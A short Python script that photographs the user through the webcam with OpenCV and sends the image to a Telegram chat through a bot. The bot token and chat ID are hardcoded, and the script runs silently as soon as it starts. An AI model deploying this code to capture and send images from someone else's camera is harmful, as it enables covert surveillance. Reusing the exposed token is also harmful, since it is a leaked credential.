import time, datetime
import telepot
from telepot.loop import MessageLoop
import cv2

def Cap():
    # Connect to your bot
    bot = telepot.Bot(token="6363502528:AAH8GIqcY16mixUOCN9jGsmv_wNt2nzlPdA")

    # Sets the id for the active chat
    chat_id=5172950600 # Your Chat ID
    # Sends a message to the chat
    cap = cv2.VideoCapture(0)

    if cap.isOpened():
        ret, frame = cap.read()

    else:
        ret = False

    img1 = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    cv2.imwrite('Capture.png',img1)
    cap.release()
    bot.sendMessage(chat_id=chat_id, text="Photo Captured")
    bot.sendPhoto(chat_id=chat_id,photo=open('Capture.png', 'rb'))

Cap()
